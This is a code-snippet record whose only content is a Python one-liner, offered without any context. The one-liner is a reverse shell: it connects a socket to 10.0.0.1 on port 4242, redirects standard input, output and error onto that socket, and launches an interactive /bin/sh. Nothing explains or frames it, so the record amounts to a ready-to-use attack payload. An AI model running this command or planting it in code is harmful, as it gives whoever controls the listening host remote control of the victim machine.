---
id: ee81e093-49c5-417f-a3b5-2e5b4e328aad
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:24.246035+00:00'
updated_at: '2023-04-10T20:25:25.998104+00:00'
---

# Code Snippet ee81e093

**Language**: Python

```python
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
